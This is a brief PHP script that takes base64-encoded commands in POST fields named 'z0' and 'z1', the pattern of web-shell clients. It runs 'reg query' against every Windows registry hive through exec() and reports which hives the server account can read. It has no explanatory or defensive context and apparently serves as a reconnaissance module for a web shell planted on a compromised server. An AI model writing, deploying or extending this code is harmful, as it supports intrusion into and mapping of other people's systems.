<?php

function scan_hives($hives, $encoding) {

    $result = [];

    foreach ($hives as $hive) {

        $cmd = "reg query $hive";
        $output = [];
        $ret = 0;

        exec($cmd . " 2>&1", $output, $ret);

        $result[$hive] = ($ret === 0);
    }

    return $result;
}

$action = base64_decode($_POST['z0']);
$encoding = base64_decode($_POST['z1']);

$hives = [
    'HKEY_CLASSES_ROOT',
    'HKEY_CURRENT_USER',
    'HKEY_LOCAL_MACHINE',
    'HKEY_USERS',
    'HKEY_CURRENT_CONFIG',
];

header('Content-Type: application/json; charset=' . $encoding);

switch ($action)
{
    case 'hive':
        echo json_encode(scan_hives($hives, $encoding), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
        break;
}

?>